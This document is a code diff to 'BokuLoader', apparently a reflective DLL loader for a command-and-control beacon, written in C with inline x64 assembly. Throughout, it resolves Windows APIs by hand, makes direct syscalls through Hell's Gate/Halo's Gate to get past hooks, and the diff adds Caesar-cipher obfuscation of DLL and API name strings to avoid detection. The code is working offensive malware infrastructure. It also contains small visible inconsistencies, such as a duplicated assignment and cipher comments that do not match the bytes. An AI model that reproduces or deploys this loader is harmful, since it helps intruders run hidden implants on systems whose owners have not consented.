@@ -2,26 +2,26 @@
 #include <windows.h>
 
 typedef struct Export {
-    PVOID   Directory;
-    ULONG32 DirectorySize;
-    PVOID   AddressTable;
-    PVOID   NameTable;
-    PVOID   OrdinalTable;
-    ULONG32 NumberOfNames;
+    void *   Directory;
+    unsigned int DirectorySize;
+    void *   AddressTable;
+    void *   NameTable;
+    void *   OrdinalTable;
+    unsigned int NumberOfNames;
 }Export;
 
 typedef struct Dll {
     void* dllBase;
     void* NewExeHeader;
-    ULONG32 size;
-    ULONG32 SizeOfHeaders;
+    unsigned int size;
+    unsigned int SizeOfHeaders;
     void* OptionalHeader;
     void* SizeOfOptionalHeader;
     void* NthSection;
-    ULONG32 NumberOfSections;
+    unsigned int NumberOfSections;
     void* EntryPoint;
     void* TextSection;
-    ULONG32 TextSectionSize;
+    unsigned int TextSectionSize;
     Export Export;
 }Dll, *PDll;
 
@@ -30,56 +30,55 @@ typedef struct Section {
     void* dst_rdll_VA;
     void* src_rdll_VA;
     void* PointerToRawData;
-    ULONG32 SizeOfSection;
-    ULONG32 Characteristics;
+    unsigned int SizeOfSection;
+    unsigned int Characteristics;
 }Section;
 
-PVOID   getDllBase(LPCSTR);
-PVOID   getFirstEntry(VOID);
-PVOID   getNextEntry(PVOID currentEntry, PVOID firstEntry);
-PVOID   getDllBaseFromEntry(PVOID entry);
-USHORT  getMachineType(PVOID NewExeHeader);
-VOID    Memcpy(PVOID destination, PVOID source, ULONG32 num);
-PVOID   getExportDirectory(PVOID dllAddr);
-ULONG   getExportDirectorySize(PVOID dllAddr);
-PVOID   getExportAddressTable(PVOID dllBase, PVOID dllExportDirectory);
-PVOID   getExportNameTable(PVOID dllBase, PVOID dllExportDirectory);
-PVOID   getExportOrdinalTable(PVOID dllBase, PVOID dllExportDirectory);
-ULONG32 getNumberOfNames(PVOID dllExportDirectory);
-PVOID   getSymbolAddress(PVOID symbolStr, ULONG StrSize, PVOID dllBase, PVOID AddressTable, PVOID NameTable, PVOID OrdinalTable, ULONG32 NumberOfNames);
-PVOID   xGetProcAddress(PVOID symbolStr, PDll dll);
-PVOID   getRdllBase(PVOID);
-PVOID   getNewExeHeader(PVOID dllBase);
-ULONG32 getDllSize(PVOID newExeHeader);
-ULONG32 getDllSizeOfHeaders(PVOID newExeHeader);
-PVOID   getOptionalHeader(PVOID NewExeHeader);
-PVOID   getSizeOfOptionalHeader(PVOID NewExeHeader);
-PVOID   add(PVOID a, PVOID b);
-ULONG32 getNumberOfSections(PVOID newExeHeaderAddr);
-PVOID   getBeaconEntryPoint(PVOID newRdllAddr, PVOID OptionalHeaderAddr);
-PVOID   getRip(VOID);
-ULONG32 copyWithDelimiter(PVOID dst, PVOID src, ULONG32 n, CHAR delimiter);
+void basicCeaser_Decrypt(int stringLength, unsigned char * string, int chiperDecrementKey);
+void *   getDllBase(char *);
+void *   getFirstEntry(void);
+void *   getNextEntry(void * currentEntry, void * firstEntry);
+void *   getDllBaseFromEntry(void * entry);
+unsigned short  getMachineType(void * NewExeHeader);
+void    Memcpy(void * destination, void * source, unsigned int num);
+void *   getExportDirectory(void * dllAddr);
+unsigned long   getExportDirectorySize(void * dllAddr);
+void *   getExportAddressTable(void * dllBase, void * dllExportDirectory);
+void *   getExportNameTable(void * dllBase, void * dllExportDirectory);
+void *   getExportOrdinalTable(void * dllBase, void * dllExportDirectory);
+unsigned int getNumberOfNames(void * dllExportDirectory);
+void *   getSymbolAddress(void * symbolStr, unsigned long StrSize, void * dllBase, void * AddressTable, void * NameTable, void * OrdinalTable, unsigned int NumberOfNames);
+void *   xGetProcAddress(void * symbolStr, PDll dll);
+void *   getRdllBase(void *);
+void *   getNewExeHeader(void * dllBase);
+unsigned int getDllSize(void * newExeHeader);
+unsigned int getDllSizeOfHeaders(void * newExeHeader);
+void *   getOptionalHeader(void * NewExeHeader);
+void *   getSizeOfOptionalHeader(void * NewExeHeader);
+void *   add(void * a, void * b);
+unsigned int getNumberOfSections(void * newExeHeaderAddr);
+void *   getBeaconEntryPoint(void * newRdllAddr, void * OptionalHeaderAddr);
+void *   getRip(void);
+unsigned int copyWithDelimiter(void * dst, void * src, unsigned int n, CHAR delimiter);
 
-DWORD findSyscallNumber(PVOID ntdllApiAddr);
-DWORD HellsGate(DWORD wSystemCall);
-VOID  HellDescent(VOID);
-DWORD halosGateDown(PVOID ntdllApiAddr, DWORD index);
-DWORD halosGateUp(PVOID ntdllApiAddr, DWORD index);
-DWORD getSyscallNumber(PVOID functionAddress);
+unsigned long findSyscallNumber(void * ntdllApiAddr);
+unsigned long HellsGate(unsigned long wSystemCall);
+void  HellDescent(void);
+unsigned long halosGateDown(void * ntdllApiAddr, unsigned long index);
+unsigned long halosGateUp(void * ntdllApiAddr, unsigned long index);
+unsigned long getSyscallNumber(void * functionAddress);
 unsigned __int64 xstrlen(char* string);
+void parseDLL(Dll * dll);
 
-typedef PVOID  (WINAPI * tLoadLibraryA)  (LPCSTR);
+typedef void *  (WINAPI * tLoadLibraryA)  (char *);
 
-typedef LONG32 (NTAPI  * tNtProt)        (HANDLE, PVOID, PVOID, ULONG32, PVOID);
-typedef LONG32 (NTAPI  * tNtAlloc)       (HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG);
-typedef LONG32 (NTAPI  * tNtFlush)       (HANDLE, PVOID, ULONG32);
-typedef LONG32 (NTAPI  * tNtFree)        (HANDLE, PVOID, PSIZE_T, ULONG);
+typedef LONG32 (NTAPI  * tNtProt)        (void *, void *, void *, unsigned int, void *);
+typedef LONG32 (NTAPI  * tNtAlloc)       (void *, void *, unsigned long *, PSIZE_T, unsigned long, unsigned long);
+typedef LONG32 (NTAPI  * tNtFree)        (void *, void *, PSIZE_T, unsigned long);
 
-typedef void*  (WINAPI * DLLMAIN)        (HINSTANCE, ULONG32, PVOID);
+typedef void*  (WINAPI * DLLMAIN)        (HINSTANCE, unsigned int, void *);
 
-void  bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA, tNtProt pNtProtectVirtualMemory);
-
-#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
+#define NtCurrentProcess() ( (void *)(LONG_PTR) -1 )
 
 #ifndef NT_SUCCESS
  #define NT_SUCCESS(Status) ((LONG32)(Status) >= 0)
@@ -89,32 +88,23 @@ __declspec(dllexport) void* WINAPI BokuLoader()
 {
     LONG32 status;
     SIZE_T size;
-    PVOID base;
+    void * base;
 
     // get the current address
-    PVOID BokuLoaderStart = getRip();
+    void * BokuLoaderStart = getRip();
 
     // Initial Source Reflective DLL
     Dll rdll_src;
-    rdll_src.dllBase              = getRdllBase(BokuLoaderStart); // search backwards from the start of BokuLoader
-    rdll_src.NewExeHeader         = getNewExeHeader(rdll_src.dllBase);
-    rdll_src.size                 = getDllSize(rdll_src.NewExeHeader);
-    rdll_src.SizeOfHeaders        = getDllSizeOfHeaders(rdll_src.NewExeHeader);
-    rdll_src.OptionalHeader       = getOptionalHeader(rdll_src.NewExeHeader);
-    rdll_src.SizeOfOptionalHeader = getSizeOfOptionalHeader(rdll_src.NewExeHeader);
-    rdll_src.NumberOfSections     = getNumberOfSections(rdll_src.NewExeHeader);
+    rdll_src.dllBase = getRdllBase(BokuLoaderStart); // search backwards from the start of BokuLoader
+    parseDLL(&rdll_src);
 
     // Get Export Directory and Export Tables for NTDLL.DLL
-    char ws_ntdll[] = {'n','t','d','l','l','.','d','l','l',0};
+    // Original String:   nTDlL.Dll // String Length:     9 // Ceaser Chiper Key: 513556 // Chiper String:     hX`BX
+    unsigned char s_ntdll[] = {0x82,0x68,0x58,0x80,0x60,0x42,0x58,0x80,0x80};
+    basicCeaser_Decrypt(9, s_ntdll, 513556);
     Dll ntdll;
-    ntdll.dllBase              = getDllBase(ws_ntdll);
-    ntdll.NewExeHeader         = getNewExeHeader(ntdll.dllBase);
-    ntdll.Export.Directory     = getExportDirectory(ntdll.dllBase);
-    ntdll.Export.DirectorySize = getExportDirectorySize(ntdll.dllBase);
-    ntdll.Export.AddressTable  = getExportAddressTable(ntdll.dllBase, ntdll.Export.Directory);
-    ntdll.Export.NameTable     = getExportNameTable(ntdll.dllBase, ntdll.Export.Directory);
-    ntdll.Export.OrdinalTable  = getExportOrdinalTable(ntdll.dllBase, ntdll.Export.Directory);
-    ntdll.Export.NumberOfNames = getNumberOfNames(ntdll.Export.Directory);
+    ntdll.dllBase = getDllBase((char *)s_ntdll);
+    parseDLL(&ntdll);
 
     // check that the rDLL is the same architecture as the host process
     if(getMachineType(rdll_src.NewExeHeader) != getMachineType(ntdll.NewExeHeader)) {
@@ -122,29 +112,27 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     }
 
     // Get Export Directory and Export Tables for Kernel32.dll
-    char ws_k32[] = {'K','E','R','N','E','L','3','2','.','D','L','L',0};
+    // Original String:   kERneL32.dLl // String Length:     12 // Ceaser Chiper Key: 1 // Chiper String:     lFSofM43/eMm
+    unsigned char s_k32[] = {0x6c,0x46,0x53,0x6f,0x66,0x4d,0x34,0x33,0x2f,0x65,0x4d,0x6d};
+    basicCeaser_Decrypt(12, s_k32, 1);
     Dll k32;
-    k32.dllBase              = getDllBase(ws_k32);
-    k32.Export.Directory     = getExportDirectory(k32.dllBase);
-    k32.Export.DirectorySize = getExportDirectorySize(k32.dllBase);
-    k32.Export.AddressTable  = getExportAddressTable(k32.dllBase, k32.Export.Directory);
-    k32.Export.NameTable     = getExportNameTable(k32.dllBase, k32.Export.Directory);
-    k32.Export.OrdinalTable  = getExportOrdinalTable(k32.dllBase, k32.Export.Directory);
-    k32.Export.NumberOfNames = getNumberOfNames(k32.Export.Directory);
+    k32.dllBase = getDllBase((char *)s_k32);
+    parseDLL(&k32);
 
-    char kstr1[] = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
+    unsigned char kstr1[] = {0x36,0x59,0x4b,0x4e,0x36,0x53,0x4c,0x5c,0x4b,0x5c,0x63,0x2b};
+    basicCeaser_Decrypt(12, kstr1, 234);
     tLoadLibraryA pLoadLibraryA = xGetProcAddress(kstr1, &k32);
 
-    char ntstr1[] = {'N','t','F','l','u','s','h','I','n','s','t','r','u','c','t','i','o','n','C','a','c','h','e',0};
-    tNtFlush pNtFlushInstructionCache = xGetProcAddress(ntstr1, &ntdll);
-
-    char ntstr2[] = {'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
+    unsigned char ntstr2[] = {0x87,0xad,0x7a,0xa5,0xa5,0xa8,0x9c,0x9a,0xad,0x9e,0x8f,0xa2,0xab,0xad,0xae,0x9a,0xa5,0x86,0x9e,0xa6,0xa8,0xab,0xb2};
+    basicCeaser_Decrypt(23, ntstr2, 1337);
     tNtAlloc pNtAllocateVirtualMemory = xGetProcAddress(ntstr2, &ntdll);
 
-    char ntstr3[] = {'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
+    unsigned char ntstr3[] = {0xc4,0xea,0xc6,0xe8,0xe5,0xea,0xdb,0xd9,0xea,0xcc,0xdf,0xe8,0xea,0xeb,0xd7,0xe2,0xc3,0xdb,0xe3,0xe5,0xe8,0xef};
+    basicCeaser_Decrypt(22, ntstr3, 1010101110);
     tNtProt pNtProtectVirtualMemory = xGetProcAddress(ntstr3, &ntdll);
 
-    char ntstr4[] = {'N','t','F','r','e','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
+    unsigned char ntstr4[] = {0x23,0x49,0x1b,0x47,0x3a,0x3a,0x2b,0x3e,0x47,0x49,0x4a,0x36,0x41,0x22,0x3a,0x42,0x44,0x47,0x4e};
+    basicCeaser_Decrypt(19, ntstr4, 13013);
     tNtFree pNtFreeVirtualMemory = xGetProcAddress(ntstr4, &ntdll);
 
     // Allocate new memory to write our new RDLL too
@@ -167,10 +155,10 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     status = ((tNtFree)HellDescent)(NtCurrentProcess(), &base, &size, MEM_RELEASE);
   
     // Save .text section address and size for destination RDLL so we can make it RE later
-    BOOL textSectionFlag = FALSE;
+    int textSectionFlag = FALSE;
     rdll_dst.TextSection = NULL;
     rdll_dst.TextSectionSize = 0;
-    DWORD numberOfSections = rdll_src.NumberOfSections;
+    unsigned long numberOfSections = rdll_src.NumberOfSections;
     rdll_src.NthSection      = add(rdll_src.OptionalHeader, rdll_src.SizeOfOptionalHeader);
     Section section;
     while( numberOfSections-- )
@@ -231,7 +219,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     void* DataDirectory = rdll_src.OptionalHeader + 0x78;
     // Get the Address of the Import Directory from the Data Directory
     void *ImportDirectory, *importEntryHint, *BaseOrdinal, *TableIndex, *EntryAddress, *importNameRVA, *LookupTableEntry, *AddressTableEntry, *EntryName, *nullCheck;
-    LPCSTR importName;
+    char * importName;
     __asm__(
         "xor rbx, rbx \n"
         "mov ebx, [rax] \n" // RVA of Import Directory
@@ -246,7 +234,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     __asm__(
         "xor rbx, rbx \n"
         "add rdx, 0xC \n"   // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
-        "mov ebx, [rdx] \n" // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name into EBX
+        "mov ebx, [rdx] \n" // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->Name into EBX
         "mov rdx, rbx \n"
         "add rax, rdx \n"        // Address of Module String = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
         : "=r" (importNameRVA),   // RDX OUT
@@ -264,7 +252,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
         }
         __asm__(
             "xor rbx, rbx \n"   // importLookupTableEntry = VA of the OriginalFirstThunk
-            "mov ebx, [rax] \n" // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->OriginalFirstThunk into EBX
+            "mov ebx, [rax] \n" // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->OriginalFirstThunk into EBX
             "add rbx, rdx \n"   // importLookupTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->OriginalFirstThunk
             "xchg rax, rbx \n"
             : "=r" (LookupTableEntry) // RAX OUT
@@ -273,8 +261,8 @@ __declspec(dllexport) void* WINAPI BokuLoader()
         );
         __asm__(
             "xor rbx, rbx \n"   // importAddressTableEntry = VA of the IAT (via first thunk not origionalfirstthunk)
-            "add rax, 0x10 \n"  // 16 (0x10) byte offset is the address of the DWORD FirstThunk within the image import descriptor
-            "mov ebx, [rax] \n" // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->FirstThunk into EBX
+            "add rax, 0x10 \n"  // 16 (0x10) byte offset is the address of the unsigned long FirstThunk within the image import descriptor
+            "mov ebx, [rax] \n" // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->FirstThunk into EBX
             "add rbx, rdx \n"   // importAddressTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->FirstThunk
             "xchg rax, rbx \n"
             : "=r" (AddressTableEntry) // RAX OUT
@@ -288,19 +276,14 @@ __declspec(dllexport) void* WINAPI BokuLoader()
         );
         while(nullCheck)
         {
-            dll_import.Export.Directory     = getExportDirectory(dll_import.dllBase);
-            dll_import.Export.DirectorySize = getExportDirectorySize(dll_import.dllBase);
-            dll_import.Export.AddressTable  = getExportAddressTable(dll_import.dllBase, dll_import.Export.Directory);
-            dll_import.Export.NameTable     = getExportNameTable(dll_import.dllBase, dll_import.Export.Directory);
-            dll_import.Export.OrdinalTable  = getExportOrdinalTable(dll_import.dllBase, dll_import.Export.Directory);
-            dll_import.Export.NumberOfNames = getNumberOfNames(dll_import.Export.Directory);
+            parseDLL(&dll_import);
 
             if( LookupTableEntry && ((PIMAGE_THUNK_DATA)LookupTableEntry)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
             {
                 __asm__( // Export Base Ordinal from the Export Directory of the module/dll being imported (0x10 offset)
                     "xor rdx, rdx \n"   // located in the Export Directory in memory of the module which functions/api's are being imported
-                    "add rax, 0x10 \n"  // DWORD Base; // 0x10 offset // RCX = &importedDllBaseOrdinal
-                    "mov edx, [rax] \n" // RAX = importedDllBaseOrdinal (Value/DWORD)
+                    "add rax, 0x10 \n"  // unsigned long Base; // 0x10 offset // RCX = &importedDllBaseOrdinal
+                    "mov edx, [rax] \n" // RAX = importedDllBaseOrdinal (Value/unsigned long)
                     "xchg rax, rdx \n"
                     : "=r" (BaseOrdinal)                // RAX OUT
                     : "r" (dll_import.Export.Directory) // RAX IN
@@ -317,11 +300,11 @@ __declspec(dllexport) void* WINAPI BokuLoader()
                     : "r" (importEntryHint), // RAX IN
                       "r" (BaseOrdinal)      // RDX IN
                 );
-                __asm__( // The ExportAddressTable/AddressOfFunctions holds DWORD (4 byte) RVA's for the executable functions/api's address
+                __asm__( // The ExportAddressTable/AddressOfFunctions holds unsigned long (4 byte) RVA's for the executable functions/api's address
                     "mov r12, rdx \n"
                     "xor rbx, rbx \n"
-                    "add bl, 0x4 \n"    // sizeof(DWORD) - This is because each entry in the table is a 4 byte DWORD which is the RVA/offset for the actual executable functions address
-                    "mul rbx \n"        // importEntryExportTableIndex * sizeof(DWORD)
+                    "add bl, 0x4 \n"    // sizeof(unsigned long) - This is because each entry in the table is a 4 byte unsigned long which is the RVA/offset for the actual executable functions address
+                    "mul rbx \n"        // importEntryExportTableIndex * sizeof(unsigned long)
                     "add rax, r12 \n"   // RVA for our functions address
                     "xor rbx, rbx \n"
                     "mov ebx, [rax] \n" // The RVA for the executable function we are importing
@@ -372,7 +355,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
         __asm__( // Do this again for the next module/DLL in the Import Directory
             "xor rbx, rbx \n"
             "add rax, 0xC  \n"  // 12(0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
-            "mov ebx, [rax] \n" // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name
+            "mov ebx, [rax] \n" // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->Name
             "mov rax, rbx \n"   // RVA of Name DLL
             "add rdx, rax \n"   // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
             : "=r" (importName),     // RDX OUT
@@ -393,7 +376,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     void* RelocDir = rdll_src.OptionalHeader + 0x98; // OptionalHeader+0x98 = &DataDirectory[Base Relocation Table]
     __asm__(
         "xor rbx, rbx \n"
-        "mov ebx, [rdx] \n" // 4 byte DWORD Virtual Address of the Relocation Directory table
+        "mov ebx, [rdx] \n" // 4 byte unsigned long Virtual Address of the Relocation Directory table
         "add rax, rbx \n"   // newRelocationTableAddr = dllBase + RVAnewRelocationTable
         : "=r" (nextRelocBlock)   // RAX OUT
         : "r" (rdll_dst.dllBase), // RAX IN
@@ -401,7 +384,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     );
     __asm__(
         "xor rbx, rbx \n"
-        "mov ebx, [rax+0x4] \n" // 4 byte DWORD Size of the Relocation Directory table
+        "mov ebx, [rax+0x4] \n" // 4 byte unsigned long Size of the Relocation Directory table
         "xchg rax, rbx \n"
         : "=r" (RelocDirSize) // RAX OUT
         : "r" (RelocDir)      // RAX IN
@@ -411,7 +394,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     {
         __asm__(
             "xor rbx, rbx \n"
-            "mov ebx, [rax+0x4] \n" // 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock
+            "mov ebx, [rax+0x4] \n" // 4 byte unsigned long of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock
             "xchg rax, rbx \n"
             : "=r" (relocBlockSize) // RAX OUT
             : "r" (nextRelocBlock)  // RAX IN
@@ -420,7 +403,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
         {
             __asm__(
                 "xor rbx, rbx \n"
-                "mov ebx, [rdx] \n" // 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->VirtualAddress
+                "mov ebx, [rdx] \n" // 4 byte unsigned long of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->VirtualAddress
                 "add rax, rbx \n"   // &reflectiveDll.dll + nextRelocationBlockRVA = VA of next Relocation Block
                 : "=r" (relocVA)          // RAX OUT
                 : "r" (rdll_dst.dllBase), // RAX IN
@@ -461,7 +444,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
             nextRelocBlock = add(nextRelocBlock, relocBlockSize);
             __asm__(
                 "xor rbx, rbx \n"
-                "mov ebx, [rax+0x4] \n" // 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock
+                "mov ebx, [rax+0x4] \n" // 4 byte unsigned long of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock
                 "xchg rax, rbx \n"
                 : "=r" (relocBlockSize) // RAX OUT
                 : "r" (nextRelocBlock)  // RAX IN
@@ -469,17 +452,12 @@ __declspec(dllexport) void* WINAPI BokuLoader()
         }
     }
 
-    ULONG32 oldprotect = 0;
+    unsigned int oldprotect = 0;
     base = rdll_dst.TextSection;
     size = rdll_dst.TextSectionSize;
-    ULONG32 newprotect = PAGE_EXECUTE_READ;
+    unsigned int newprotect = PAGE_EXECUTE_READ;
     HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
     status = ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, newprotect, &oldprotect);
-    if (!NT_SUCCESS(status))
-        return NULL;
-
-    HellsGate(getSyscallNumber(pNtFlushInstructionCache));
-    status = ((tNtFlush)HellDescent)(NtCurrentProcess(), NULL, 0);
     if (!NT_SUCCESS(status))
         return NULL;
 
@@ -488,15 +466,31 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     return rdll_dst.EntryPoint;
 }
 
-PVOID xGetProcAddress(PVOID symbolStr, PDll dll)
+void parseDLL(Dll * dll){
+    dll->NewExeHeader         = getNewExeHeader(dll->dllBase);
+    dll->NewExeHeader         = getNewExeHeader(dll->dllBase);
+    dll->size                 = getDllSize(dll->NewExeHeader);
+    dll->SizeOfHeaders        = getDllSizeOfHeaders(dll->NewExeHeader);
+    dll->OptionalHeader       = getOptionalHeader(dll->NewExeHeader);
+    dll->SizeOfOptionalHeader = getSizeOfOptionalHeader(dll->NewExeHeader);
+    dll->NumberOfSections     = getNumberOfSections(dll->NewExeHeader);
+    dll->Export.Directory     = getExportDirectory(dll->dllBase);
+    dll->Export.DirectorySize = getExportDirectorySize(dll->dllBase);
+    dll->Export.AddressTable  = getExportAddressTable(dll->dllBase, dll->Export.Directory);
+    dll->Export.NameTable     = getExportNameTable(dll->dllBase, dll->Export.Directory);
+    dll->Export.OrdinalTable  = getExportOrdinalTable(dll->dllBase, dll->Export.Directory);
+    dll->Export.NumberOfNames = getNumberOfNames(dll->Export.Directory);
+}
+
+void * xGetProcAddress(void * symbolStr, Dll * dll)
 {
-    CHAR  dll_name[64];
-    CHAR  api_name[128];
-    DWORD api_length, i;
-    Dll   ref_dll;
-    PVOID firstEntry;
-    PVOID currentEntry;
-    DWORD StrSize;
+    char   dll_name[64];
+    char   api_name[128];
+    unsigned long  api_length, i;
+    Dll    ref_dll;
+    void * firstEntry;
+    void * currentEntry;
+    unsigned long  StrSize;
 
     // if there is no export directory, return NULL
     if (!dll->Export.DirectorySize)
@@ -517,15 +511,15 @@ PVOID xGetProcAddress(PVOID symbolStr, PDll dll)
         : "r" (symbolStr) // RAX IN
     );
 
-    PVOID address = getSymbolAddress(symbolStr, StrSize, dll->dllBase, dll->Export.AddressTable, dll->Export.NameTable, dll->Export.OrdinalTable, dll->Export.NumberOfNames);
+    void * address = getSymbolAddress(symbolStr, StrSize, dll->dllBase, dll->Export.AddressTable, dll->Export.NameTable, dll->Export.OrdinalTable, dll->Export.NumberOfNames);
 
     // if not found, return NULL
     if (!address)
         return NULL;
 
     // is this a forward reference?
-    if ((ULONG_PTR)address >= (ULONG_PTR)dll->Export.Directory &&
-        (ULONG_PTR)address <  (ULONG_PTR)dll->Export.Directory + dll->Export.DirectorySize)
+    if ((unsigned long *)address >= (unsigned long *)dll->Export.Directory &&
+        (unsigned long *)address <  (unsigned long *)dll->Export.Directory + dll->Export.DirectorySize)
     {
         // copy DLL name
         i = copyWithDelimiter(dll_name, address, sizeof(dll_name) - 4, '.');
@@ -705,19 +699,19 @@ __asm__(
     "ret \n" // return ExportDirectory Size;
 "getExportAddressTable: \n"
     "xor rax, rax \n"
-    "add rdx, 0x1C \n"              // DWORD AddressOfFunctions; // 0x1C offset // RDX = &RVAExportAddressTable
+    "add rdx, 0x1C \n"              // unsigned long AddressOfFunctions; // 0x1C offset // RDX = &RVAExportAddressTable
     "mov eax, [rdx] \n"             // RVAExportAddressTable (Value/RVA)
     "add rax, rcx \n"               // VA ExportAddressTable (The address of the Export table in running memory of the process)
     "ret \n" // return ExportAddressTable
 "getExportNameTable: \n"
     "xor rax, rax \n"
-    "add rdx, 0x20 \n"              // DWORD AddressOfFunctions; // 0x20 offset
+    "add rdx, 0x20 \n"              // unsigned long AddressOfFunctions; // 0x20 offset
     "mov eax, [rdx] \n"             // RVAExportAddressOfNames (Value/RVA)
     "add rax, rcx \n"               // VA ExportAddressOfNames
     "ret \n" // return ExportNameTable;
 "getExportOrdinalTable: \n"
     "xor rax, rax \n"
-    "add rdx, 0x24 \n"              // DWORD AddressOfNameOrdinals; // 0x24 offset
+    "add rdx, 0x24 \n"              // unsigned long AddressOfNameOrdinals; // 0x24 offset
     "mov eax, [rdx] \n"             // RVAExportAddressOfNameOrdinals (Value/RVA)
     "add rax, rcx \n"               // VA ExportAddressOfNameOrdinals
     "ret \n" // return ExportOrdinalTable;
@@ -734,7 +728,7 @@ __asm__(
     "xchg rcx, rdx \n"              // symbolStringSize & RDX =symbolString
     "push rcx \n"                   // push str len to stack
 "lFindSym: \n"
-    "mov rcx, [rsp] \n"             // DWORD symbolStringSize (Reset string length counter for each loop)
+    "mov rcx, [rsp] \n"             // unsigned long symbolStringSize (Reset string length counter for each loop)
     "xor rdi, rdi \n"               // Clear RDI for setting up string name retrieval
     "mov edi, [r10+rax*4] \n"       // RVA NameString = [&NamePointerTable + (Counter * 4)]
     "add rdi, r8 \n"                // &NameString    = RVA NameString + &module.dll
@@ -923,4 +917,16 @@ __asm__(
 "getDllBaseFromEntry: \n"
     "mov rax, [rcx+0x20] \n"
     "ret \n"
+
+"basicCeaser_Decrypt:\n"
+ "mov rsi, rdx\n"
+ "xor rax, rax\n"
+ "add al, r8b\n"
+"bcdLoop:\n"
+ "sub [rsi], al\n"
+ "inc rsi\n"
+ "dec cl\n"
+ "test cl,cl\n"
+ "jnz bcdLoop\n"
+ "ret\n"
 );
